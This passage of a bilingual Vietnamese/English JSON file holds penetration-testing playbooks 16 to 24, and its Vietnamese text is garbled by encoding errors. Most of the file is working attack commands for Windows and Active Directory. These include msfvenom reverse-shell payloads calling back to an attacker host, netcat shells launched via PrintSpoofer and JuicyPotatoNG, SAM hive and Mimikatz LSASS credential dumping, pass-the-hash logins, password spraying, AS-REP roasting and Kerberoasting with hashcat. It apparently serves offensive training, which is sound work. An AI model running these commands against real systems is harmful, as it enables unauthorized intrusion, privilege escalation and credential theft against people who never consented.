      { "vi": "**X√°c ƒë·ªãnh Task:**", "en": "**Identify Task:**", "command": "schtasks /query /fo LIST /v | findstr /B /C:\"Task To Run\" /C:\"Run As User\"" },
      { "vi": "**Ki·ªÉm tra Quy·ªÅn ghi:**", "en": "**Check Write Permissions:**", "command": "icacls C:\\Tasks\\cleanup.exe" },
      { "vi": "**T·∫°o Payload (Kali):** (T√™n file kh·ªõp v·ªõi TaskToRun)", "en": "**Create Payload (Kali):** (Filename matches TaskToRun)", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o cleanup.exe" },
      { "vi": "**Sao l∆∞u Executable G·ªëc:**", "en": "**Backup Original Executable:**", "command": "copy C:\\Tasks\\cleanup.exe C:\\Windows\\Temp\\cleanup.bak" },
      { "vi": "**T·∫£i Payload l√™n Target:**", "en": "**Upload Payload to Target:**" },
      { "vi": "**Thay th·∫ø Executable:**", "en": "**Replace Executable:**", "command": "copy C:\\Windows\\Temp\\cleanup.exe C:\\Tasks\\cleanup.exe /Y" },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Ch·ªù Task Ch·∫°y:** (Ho·∫∑c k√≠ch ho·∫°t th·ªß c√¥ng)", "en": "**Wait for Task:** (Or trigger manually)", "command": "schtasks /run /tn TaskName" },
      { "vi": "**X√°c nh·∫≠n Shell ƒê·∫∑c quy·ªÅn.**", "en": "**Confirm Privileged Shell.**" },
      { "vi": "**(Quan tr·ªçng) Kh√¥i ph·ª•c Executable G·ªëc:**", "en": "**(Important) Restore Original Executable:**" }
    ],
    "related_knowledge_ids": ["winprivesc_scheduled_tasks_vector", "schtasks", "icacls", "msfvenom", "rce_kali_setup"]
  },
  "playbook_17_windows_privesc_alwaysinstallelevated": {
    "title": {
      "vi": "Playbook 17: Windows PrivEsc qua AlwaysInstallElevated",
      "en": "Playbook 17: Windows PrivEsc via AlwaysInstallElevated"
    },
    "assumption": "C√≥ shell user Windows. Ki·ªÉm tra registry (`reg query`) cho th·∫•y c·∫£ hai key `HKCU\\...\\Installer\\AlwaysInstallElevated` v√† `HKLM\\...\\Installer\\AlwaysInstallElevated` ƒë·ªÅu ƒë∆∞·ª£c set gi√° tr·ªã l√† 1.",
    "objective": "Leo thang l√™n SYSTEM b·∫±ng c√°ch c√†i ƒë·∫∑t m·ªôt MSI ƒë·ªôc h·∫°i.",
    "tools": ["reg", "msfvenom", "msiexec", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["AlwaysInstallElevated"],
    "targets": ["Windows Installer Policy"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "alwaysinstallelevated", "registry", "msi", "msfvenom", "msiexec"],
    "content": "## Playbook 17: Windows PrivEsc qua AlwaysInstallElevated üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** C·∫£ hai registry key AlwaysInstallElevated ƒë·ªÅu ƒë∆∞·ª£c set l√† 1.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Registry Keys:**\n    ```powershell\n    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    ```\n   \n2.  **T·∫°o Payload MSI:**\n    ```bash\n    # Tr√™n Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 --platform windows -f msi -o rev.msi \n    ```\n   \n3.  **T·∫£i Payload MSI l√™n:** Chuy·ªÉn `rev.msi` v√†o `C:\\Windows\\Temp\\`.\n4.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n5.  **Th·ª±c thi Tr√¨nh c√†i ƒë·∫∑t MSI:**\n    ```powershell\n    msiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi \n    ```\n   \n6.  **X√°c nh·∫≠n Shell SYSTEM.**",
    "steps": [
      { "vi": "**X√°c nh·∫≠n Registry Key (HKCU):**", "en": "**Confirm Registry Key (HKCU):**", "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { "vi": "**X√°c nh·∫≠n Registry Key (HKLM):**", "en": "**Confirm Registry Key (HKLM):**", "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { "vi": "**T·∫°o Payload MSI (Kali):**", "en": "**Create MSI Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 --platform windows -f msi -o rev.msi" },
      { "vi": "**T·∫£i Payload MSI l√™n Target:** (v√≠ d·ª•: C:\\Windows\\Temp\\)", "en": "**Upload MSI Payload to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Th·ª±c thi Tr√¨nh c√†i ƒë·∫∑t MSI:**", "en": "**Execute MSI Installer:**", "command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi" },
      { "vi": "**X√°c nh·∫≠n Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_alwaysinstallelevated", "reg query", "msfvenom", "msiexec", "rce_kali_setup"]
  },
  "playbook_18_windows_privesc_seimpersonate": {
    "title": {
      "vi": "Playbook 18: Windows PrivEsc qua SeImpersonatePrivilege (Potato Attack)",
      "en": "Playbook 18: Windows PrivEsc via SeImpersonatePrivilege (Potato Attack)"
    },
    "assumption": "C√≥ shell user Windows. `whoami /priv` cho th·∫•y user c√≥ `SeImpersonatePrivilege` ho·∫∑c `SeAssignPrimaryTokenPrivilege` ƒë∆∞·ª£c b·∫≠t.",
    "objective": "Leo thang l√™n SYSTEM b·∫±ng c√°ch l·∫°m d·ª•ng token impersonation.",
    "tools": ["whoami", "PrintSpoofer", "JuicyPotatoNG", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Token Impersonation", "Potato Attack", "SeImpersonatePrivilege"],
    "targets": ["Windows Privileges"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "seimpersonateprivilege", "token impersonation", "potato attack", "printspoofer", "juicypotatong"],
    "content": "## Playbook 18: Windows PrivEsc qua SeImpersonatePrivilege (Potato Attack) üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** User c√≥ `SeImpersonatePrivilege`.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Privilege:** `whoami /priv`.\n2.  **Ch·ªçn v√† T·∫£i Potato Tool:**\n    * **PrintSpoofer:** Th∆∞·ªùng hi·ªáu qu·∫£ tr√™n c√°c h·ªá th·ªëng m·ªõi h∆°n.\n    * **JuicyPotatoNG:** C·∫ßn t√¨m CLSID ph√π h·ª£p (th∆∞·ªùng d√πng WinPEAS ƒë·ªÉ g·ª£i √Ω).\n    * T·∫£i tool (v√≠ d·ª• `PrintSpoofer.exe`) l√™n `C:\\Windows\\Temp\\`.\n3.  **T·∫£i Payload (N·∫øu c·∫ßn):** T·∫£i `nc.exe` l√™n `C:\\Windows\\Temp\\`.\n4.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4446`.\n5.  **Th·ª±c thi Potato Tool:**\n    * **PrintSpoofer:**\n      ```powershell\n      C:\\Windows\\Temp\\PrintSpoofer.exe -i -c \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4446 -e cmd.exe\" \n      ```\n     \n    * **JuicyPotatoNG (V√≠ d·ª•):**\n      ```powershell\n      C:\\Windows\\Temp\\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\nc.exe -a \"<kali_ip> 4446 -e cmd.exe\" \n      ```\n     \n6.  **X√°c nh·∫≠n Shell SYSTEM.**",
    "steps": [
      { "vi": "**X√°c nh·∫≠n Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv" },
      { "vi": "**Ch·ªçn v√† T·∫£i Potato Tool:** (PrintSpoofer ho·∫∑c JuicyPotatoNG) v√†o C:\\Windows\\Temp\\.", "en": "**Select and Upload Potato Tool:** (PrintSpoofer or JuicyPotatoNG) to C:\\Windows\\Temp\\." },
      { "vi": "**T·∫£i Payload (nc.exe) l√™n Target:** (N·∫øu d√πng nc)", "en": "**Upload Payload (nc.exe) to Target:** (If using nc)" },
      { "vi": "**M·ªü Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Th·ª±c thi PrintSpoofer:**", "en": "**Execute PrintSpoofer:**", "command": "C:\\Windows\\Temp\\PrintSpoofer.exe -i -c \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4446 -e cmd.exe\"" },
      { "vi": "**Th·ª±c thi JuicyPotatoNG (V√≠ d·ª•):**", "en": "**Execute JuicyPotatoNG (Example):**", "command": "C:\\Windows\\Temp\\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\nc.exe -a \"<kali_ip> 4446 -e cmd.exe\"" },
      { "vi": "**X√°c nh·∫≠n Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_token_impersonation", "whoami /priv", "privesc_windows", "printspoofer", "juicypotatong", "rce_kali_setup", "nc"]
  },
  "playbook_19_windows_privesc_sam_backup": {
    "title": {
      "vi": "Playbook 19: Windows PrivEsc qua SAM/SYSTEM Backup",
      "en": "Playbook 19: Windows PrivEsc via SAM/SYSTEM Backup"
    },
    "assumption": "C√≥ shell user Windows. T√¨m th·∫•y c√°c b·∫£n sao l∆∞u c·ªßa file SAM v√† SYSTEM registry hives (v√≠ d·ª• trong `C:\\Windows\\Repair` ho·∫∑c `C:\\Windows\\System32\\config\\RegBack`) m√† user hi·ªán t·∫°i c√≥ th·ªÉ ƒë·ªçc.",
    "objective": "Tr√≠ch xu·∫•t NTLM hashes t·ª´ c√°c b·∫£n sao l∆∞u v√† s·ª≠ d·ª•ng ch√∫ng ƒë·ªÉ leo thang.",
    "tools": ["dir", "copy", "impacket-secretsdump", "evil-winrm", "impacket-psexec"],
    "phases": ["Privilege Escalation", "Credential Access"],
    "techniques": ["Offline Hash Dumping", "Pass the Hash"],
    "targets": ["SAM Hive", "SYSTEM Hive"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sam dump", "system hive", "offline hash dump", "impacket-secretsdump", "pass the hash", "pth"],
    "content": "## Playbook 19: Windows PrivEsc qua SAM/SYSTEM Backup üíª‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** T√¨m th·∫•y b·∫£n sao l∆∞u SAM v√† SYSTEM c√≥ th·ªÉ ƒë·ªçc.\n\n**M·ª•c ti√™u:** Tr√≠ch xu·∫•t NTLM hashes v√† leo thang.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh V·ªã tr√≠ Backup:**\n    ```powershell\n    dir C:\\Windows\\Repair\\SAM \n    dir C:\\Windows\\System32\\config\\RegBack\\* \n    ```\n   \n2.  **Sao ch√©p Hives:** Copy c√°c file SAM v√† SYSTEM v√†o th∆∞ m·ª•c c√≥ th·ªÉ truy c·∫≠p (v√≠ d·ª•: `C:\\Users\\Public\\`).\n3.  **T·∫£i Hives v·ªÅ Kali:** S·ª≠ d·ª•ng HTTP upload server ho·∫∑c SMB server tr√™n Kali ƒë·ªÉ t·∫£i file v·ªÅ.\n4.  **Dump Hashes Offline:**\n    ```bash\n    # Tr√™n Kali\n    impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL \n    ```\n   \n5.  **S·ª≠ d·ª•ng Hash (Pass the Hash):** L·∫•y hash NTLM c·ªßa Administrator ho·∫∑c user trong nh√≥m Admin.\n    * **Evil-WinRM:** `evil-winrm -i <target_ip> -u Administrator -H <NTHash>`\n    * **Psexec:** `impacket-psexec -hashes <LMHash>:<NTHash> Administrator@<target_ip>`\n6.  **X√°c nh·∫≠n Shell Admin/SYSTEM.**",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh V·ªã tr√≠ Backup:**", "en": "**Identify Backup Location:**", "command": "dir C:\\Windows\\Repair\\SAM; dir C:\\Windows\\System32\\config\\RegBack\\*" },
      { "vi": "**Sao ch√©p Hives:** (v√≠ d·ª•: v√†o C:\\Users\\Public\\)", "en": "**Copy Hives:** (e.g., to C:\\Users\\Public\\)" },
      { "vi": "**T·∫£i Hives v·ªÅ Kali:** (S·ª≠ d·ª•ng HTTP/SMB upload)", "en": "**Download Hives to Kali:** (Using HTTP/SMB upload)" },
      { "vi": "**Dump Hashes Offline (Kali):**", "en": "**Dump Hashes Offline (Kali):**", "command": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL" },
      { "vi": "**S·ª≠ d·ª•ng Hash (PtH - Evil-WinRM):**", "en": "**Use Hash (PtH - Evil-WinRM):**", "command": "evil-winrm -i <target_ip> -u Administrator -H <NTHash>" },
      { "vi": "**S·ª≠ d·ª•ng Hash (PtH - Psexec):**", "en": "**Use Hash (PtH - Psexec):**", "command": "impacket-psexec -hashes <LMHash>:<NTHash> Administrator@<target_ip>" },
      { "vi": "**X√°c nh·∫≠n Shell Admin/SYSTEM.**", "en": "**Confirm Admin/SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_sam_system_dump", "dir", "copy", "file_transfer_http_download", "file_transfer_smb_download", "impacket-secretsdump", "evil-winrm_connection", "impacket-psexec", "password_cracking_pass_the_hash"]
  },
  "playbook_20_windows_postex_mimikatz": {
    "title": {
      "vi": "Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping",
      "en": "Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping"
    },
    "assumption": "ƒê√£ c√≥ shell Administrator ho·∫∑c SYSTEM tr√™n m√°y Windows.",
    "objective": "Dump credentials (plaintext, hashes, Kerberos tickets) t·ª´ b·ªô nh·ªõ LSASS v√† SAM.",
    "tools": ["mimikatz"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "LSASS Dumping", "SAM Dumping"],
    "targets": ["LSASS", "SAM Database", "Kerberos Tickets"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "mimikatz", "credential dumping", "lsass", "sam", "kerberos tickets", "sekurlsa::logonpasswords", "lsadump::sam"], // B·ªè 'sekurlsa::tickets' kh·ªèi tags v√¨ n√≥ l√† l·ªánh
    "content": "## Playbook 20: Windows Post-Exploitation - Mimikatz Credential Dumping üïµÔ∏è‚Äç‚ôÄÔ∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell Admin/SYSTEM.\n\n**M·ª•c ti√™u:** Dump credentials t·ª´ LSASS v√† SAM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T·∫£i Mimikatz l√™n:** Chuy·ªÉn `mimikatz.exe` l√™n target (v√≠ d·ª•: `C:\\Windows\\Temp\\`).\n2.  **Ch·∫°y Mimikatz v√† Dump:**\n    ```powershell\n    cd C:\\Windows\\Temp\\\n    .\\mimikatz.exe\n    privilege::debug \n    token::elevate # N·∫øu ch∆∞a l√† SYSTEM\n    sekurlsa::logonpasswords # Dump t·ª´ LSASS (c√≥ th·ªÉ c√≥ plaintext)\n    lsadump::sam # Dump NTLM hash t·ª´ SAM\n    sekurlsa::tickets /export # Dump Kerberos tickets (d·∫°ng .kirbi)\n    exit\n    ```\n   \n3.  **Ph√¢n t√≠ch K·∫øt qu·∫£:** L∆∞u l·∫°i to√†n b·ªô output. T√¨m ki·∫øm plaintext passwords, NTLM hashes c·ªßa c√°c user quan tr·ªçng (admins, service accounts), v√† Kerberos tickets c√≥ th·ªÉ d√πng cho Pass the Ticket.",
    "steps": [
      { "vi": "**T·∫£i Mimikatz l√™n Target:** (v√≠ d·ª•: C:\\Windows\\Temp\\)", "en": "**Upload Mimikatz to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**Ch·∫°y Mimikatz:**", "en": "**Run Mimikatz:**", "command": ".\\mimikatz.exe" },
      { "vi": "(Mimikatz) B·∫≠t Debug Privilege:", "en": "(Mimikatz) Enable Debug Privilege:", "command": "privilege::debug" },
      { "vi": "(Mimikatz) Elevate Token (n·∫øu c·∫ßn):", "en": "(Mimikatz) Elevate Token (if needed):", "command": "token::elevate" },
      { "vi": "(Mimikatz) Dump LSASS:", "en": "(Mimikatz) Dump LSASS:", "command": "sekurlsa::logonpasswords" },
      { "vi": "(Mimikatz) Dump SAM:", "en": "(Mimikatz) Dump SAM:", "command": "lsadump::sam" },
      { "vi": "(Mimikatz) Dump Kerberos Tickets:", "en": "(Mimikatz) Dump Kerberos Tickets:", "command": "sekurlsa::tickets /export" },
      { "vi": "(Mimikatz) Tho√°t:", "en": "(Mimikatz) Exit:", "command": "exit" },
      { "vi": "**Ph√¢n t√≠ch K·∫øt qu·∫£:** T√¨m plaintext, NTLM hashes, Kerberos tickets.", "en": "**Analyze Results:** Look for plaintext, NTLM hashes, Kerberos tickets." }
    ],
    "related_knowledge_ids": ["mimikatz_credential_dumping", "password_cracking_ntlm_mimikatz", "ad_auth_cached_creds_mimikatz", "sekurlsa::logonpasswords", "lsadump::sam", "sekurlsa::tickets", "ad_attack_pass_the_ticket"]
  },
  "playbook_21_ad_foothold_spray": {
    "title": {
      "vi": "Playbook 21: AD Initial Access via Password Spraying",
      "en": "Playbook 21: AD Initial Access via Password Spraying"
    },
    "assumption": "ƒê√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c m·ªôt danh s√°ch username Active Directory h·ª£p l·ªá (t·ª´ OSINT, enum SMB/LDAP) v√† m·ªôt m·∫≠t kh·∫©u y·∫øu/ph·ªï bi·∫øn (v√≠ d·ª•: `Summer2025!`).",
    "objective": "T√¨m √≠t nh·∫•t m·ªôt c·∫∑p credential h·ª£p l·ªá trong domain b·∫±ng password spraying.",
    "tools": ["crackmapexec", "kerbrute"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Password Spraying"],
    "targets": ["Active Directory Accounts", "SMB", "Kerberos"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "initial access", "password spraying", "crackmapexec", "kerbrute"],
    "content": "## Playbook 21: AD Initial Access via Password Spraying üè¢üîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ danh s√°ch user AD v√† m·ªôt m·∫≠t kh·∫©u y·∫øu/ph·ªï bi·∫øn ƒë·ªÉ th·ª≠.\n\n**M·ª•c ti√™u:** T√¨m credential h·ª£p l·ªá.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ki·ªÉm tra Ch√≠nh s√°ch Lockout:** N·∫øu c√≥ th·ªÉ, ki·ªÉm tra ng∆∞·ª°ng lockout (`net accounts /domain` tr√™n m√°y ƒë√£ join domain).\n2.  **Password Spraying:**\n    * **CrackMapExec (SMB):**\n      ```bash\n      crackmapexec smb <DC_IP_or_Subnet> -u users.txt -p 'Summer2025!' -d <domain.local> --continue-on-success\n      ```\n     \n    * **Kerbrute (Kerberos):**\n      ```bash\n      kerbrute passwordspray -d <domain.local> users.txt 'Summer2025!'\n      ```\n     \n3.  **X√°c nh·∫≠n Credential:** N·∫øu t√¨m th·∫•y t√†i kho·∫£n h·ª£p l·ªá (v√≠ d·ª•: `[+] ... SUCCESS`), th·ª≠ ƒëƒÉng nh·∫≠p b·∫±ng `crackmapexec`, `evil-winrm`, ho·∫∑c `psexec` ƒë·ªÉ x√°c nh·∫≠n.",
    "steps": [
      { "vi": "**Ki·ªÉm tra Ch√≠nh s√°ch Lockout:** (N·∫øu c√≥ th·ªÉ)", "en": "**Check Lockout Policy:** (If possible)", "command": "net accounts /domain" },
      { "vi": "**Password Spraying (CrackMapExec - SMB):**", "en": "**Password Spraying (CrackMapExec - SMB):**", "command": "crackmapexec smb <DC_IP_or_Subnet> -u users.txt -p 'Summer2025!' -d <domain.local> --continue-on-success" },
      { "vi": "**Password Spraying (Kerbrute - Kerberos):**", "en": "**Password Spraying (Kerbrute - Kerberos):**", "command": "kerbrute passwordspray -d <domain.local> users.txt 'Summer2025!'" },
      { "vi": "**X√°c nh·∫≠n Credential:** Th·ª≠ ƒëƒÉng nh·∫≠p v·ªõi creds t√¨m ƒë∆∞·ª£c.", "en": "**Confirm Credential:** Attempt login with found creds." }
    ],
    "related_knowledge_ids": ["ad_attack_password_spraying", "net accounts", "crackmapexec", "ad_attack_password_spraying_ad", "ad_lateral_movement_crackmapexec", "kerbrute"]
  },
  "playbook_22_ad_attack_asrep_roast": {
    "title": {
      "vi": "Playbook 22: AD Attack - AS-REP Roasting",
      "en": "Playbook 22: AD Attack - AS-REP Roasting"
    },
    "assumption": "C√≥ kh·∫£ nƒÉng truy v·∫•n AD (v√≠ d·ª•: shell user tr√™n m√°y ƒë√£ join domain, ho·∫∑c creds user th∆∞·ªùng). Enumeration (PowerView `Get-DomainUser -PreauthNotRequired`) ph√°t hi·ªán user kh√¥ng y√™u c·∫ßu Kerberos pre-authentication.",
    "objective": "L·∫•y v√† crack hash AS-REP c·ªßa user ƒë·ªÉ c√≥ m·∫≠t kh·∫©u plaintext.",
    "tools": ["impacket-GetNPUsers", "Rubeus", "hashcat", "PowerView"],
    "phases": ["Credential Access"],
    "techniques": ["AS-REP Roasting", "Kerberos Attack", "Offline Hash Cracking"],
    "targets": ["Active Directory User Accounts"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "asrep roasting", "kerberos", "preauthentication", "impacket-getnpusers", "rubeus", "hashcat", "powerview"],
    "content": "## Playbook 22: AD Attack - AS-REP Roasting üíîüîë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán user kh√¥ng c·∫ßn pre-authentication.\n\n**M·ª•c ti√™u:** L·∫•y v√† crack hash AS-REP.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m Users (PowerView):**\n    ```powershell\n    # Tr√™n m√°y Windows ƒë√£ join domain\n    Import-Module .\\PowerView.ps1 \n    Get-DomainUser -PreauthNotRequired \n    ```\n   \n2.  **L·∫•y Hash (impacket-GetNPUsers):**\n    ```bash\n    # T·ª´ Kali\n    impacket-GetNPUsers <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -usersfile <target_users.txt> -format hashcat -outputfile asrep.hashes \n    ```\n   \n3.  **L·∫•y Hash (Rubeus):**\n    ```powershell\n    # T·ª´ Windows\n    .\\Rubeus.exe asreproast /outfile:asrep.hashes /format:hashcat \n    ```\n   \n4.  **Crack Hash (Hashcat):**\n    ```bash\n    # Tr√™n Kali\n    hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \n    ```\n   \n5.  **S·ª≠ d·ª•ng M·∫≠t kh·∫©u.**",
    "steps": [
      { "vi": "**T√¨m Users (PowerView):**", "en": "**Find Users (PowerView):**", "command": "Import-Module .\\PowerView.ps1; Get-DomainUser -PreauthNotRequired" },
      { "vi": "**L·∫•y Hash (impacket-GetNPUsers - Kali):**", "en": "**Get Hash (impacket-GetNPUsers - Kali):**", "command": "impacket-GetNPUsers <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -usersfile <target_users.txt> -format hashcat -outputfile asrep.hashes" },
      { "vi": "**L·∫•y Hash (Rubeus - Windows):**", "en": "**Get Hash (Rubeus - Windows):**", "command": ".\\Rubeus.exe asreproast /outfile:asrep.hashes /format:hashcat" },
      { "vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt" },
      { "vi": "**S·ª≠ d·ª•ng M·∫≠t kh·∫©u.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_asrep_roasting", "PowerView", "ad_pentest_enum_powerview", "impacket-GetNPUsers", "impacket_getnpusers", "Rubeus", "ad_attack_asrep_roasting_ad", "hashcat", "mode_18200"]
  },
  "playbook_23_ad_attack_kerberoast": {
    "title": {
      "vi": "Playbook 23: AD Attack - Kerberoasting",
      "en": "Playbook 23: AD Attack - Kerberoasting"
    },
    "assumption": "C√≥ kh·∫£ nƒÉng truy v·∫•n AD (shell user ho·∫∑c creds user th∆∞·ªùng). Enumeration (PowerView `Get-NetUser -SPN`, BloodHound) ph√°t hi·ªán user account (kh√¥ng ph·∫£i computer account) c√≥ Service Principal Name (SPN) ƒë∆∞·ª£c c·∫•u h√¨nh.",
    "objective": "L·∫•y v√† crack hash TGS c·ªßa service account ƒë·ªÉ c√≥ m·∫≠t kh·∫©u plaintext.",
    "tools": ["impacket-GetUserSPNs", "Rubeus", "hashcat", "PowerView", "BloodHound"],
    "phases": ["Credential Access"],
    "techniques": ["Kerberoasting", "Kerberos Attack", "Offline Hash Cracking"],
    "targets": ["Active Directory Service Accounts"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "kerberoasting", "kerberos", "spn", "tgs", "impacket-getuserspns", "rubeus", "hashcat", "powerview", "bloodhound"],
    "content": "## Playbook 23: AD Attack - Kerberoasting üî•üîë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán user account c√≥ SPN.\n\n**M·ª•c ti√™u:** L·∫•y v√† crack hash TGS.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m Users (PowerView):**\n    ```powershell\n    # Tr√™n m√°y Windows ƒë√£ join domain\n    Import-Module .\\PowerView.ps1 \n    Get-NetUser -SPN | select samaccountname,serviceprincipalname \n    ```\n   \n    * Ho·∫∑c t√¨m trong BloodHound.\n2.  **L·∫•y Hash (impacket-GetUserSPNs):**\n    ```bash\n    # T·ª´ Kali\n    impacket-GetUserSPNs <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -outputfile krb_tgs.hashes \n    ```\n   \n3.  **L·∫•y Hash (Rubeus):**\n    ```powershell\n    # T·ª´ Windows\n    .\\Rubeus.exe kerberoast /outfile:krb_tgs.hashes /format:hashcat \n    ```\n   \n4.  **Crack Hash (Hashcat):**\n    ```bash\n    # Tr√™n Kali\n    hashcat -m 13100 krb_tgs.hashes /usr/share/wordlists/rockyou.txt \n    ```\n   \n5.  **S·ª≠ d·ª•ng M·∫≠t kh·∫©u.**",
    "steps": [
      { "vi": "**T√¨m Users (PowerView):**", "en": "**Find Users (PowerView):**", "command": "Import-Module .\\PowerView.ps1; Get-NetUser -SPN | select samaccountname,serviceprincipalname" },
      { "vi": "**L·∫•y Hash (impacket-GetUserSPNs - Kali):**", "en": "**Get Hash (impacket-GetUserSPNs - Kali):**", "command": "impacket-GetUserSPNs <domain>/<your_user>:<your_pass> -dc-ip <DC_IP> -request -outputfile krb_tgs.hashes" },
      { "vi": "**L·∫•y Hash (Rubeus - Windows):**", "en": "**Get Hash (Rubeus - Windows):**", "command": ".\\Rubeus.exe kerberoast /outfile:krb_tgs.hashes /format:hashcat" },
      { "vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 13100 krb_tgs.hashes /usr/share/wordlists/rockyou.txt" },
      { "vi": "**S·ª≠ d·ª•ng M·∫≠t kh·∫©u.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_kerberoasting", "PowerView", "ad_enum_spn", "impacket-GetUserSPNs", "impacket_getuserspns", "Rubeus", "ad_attack_kerberoasting_ad", "hashcat", "mode_13100"]
  },
  "playbook_24_ad_attack_gpp_decrypt": {
    "title": {
      "vi": "Playbook 24: AD Attack - GPP Password Decryption",
      "en": "Playbook 24: AD Attack - GPP Password Decryption"
    },
    "assumption": "C√≥ quy·ªÅn ƒë·ªçc SYSVOL share tr√™n Domain Controller (th∆∞·ªùng l√† m·ªçi user domain ƒë·ªÅu c√≥). ƒê√£ t√¨m th·∫•y file XML (v√≠ d·ª•: `Groups.xml`) trong `Policies` ch·ª©a thu·ªôc t√≠nh `cpassword`.",
    "objective": "Gi·∫£i m√£ m·∫≠t kh·∫©u `cpassword` ƒë·ªÉ c√≥ m·∫≠t kh·∫©u plaintext (th∆∞·ªùng l√† c·ªßa local administrator).",
    "tools": ["smbclient", "grep", "gpp-decrypt", "crackmapexec"],
    "phases": ["Credential Access"],
    "techniques": ["GPP Password Abuse", "SYSVOL Enumeration"],
    "targets": ["Group Policy Preferences", "SYSVOL"],
    "os": ["Any"],
    "tags": ["ad", "active directory", "gpp", "cpassword", "sysvol", "group policy", "gpp-decrypt", "crackmapexec"],
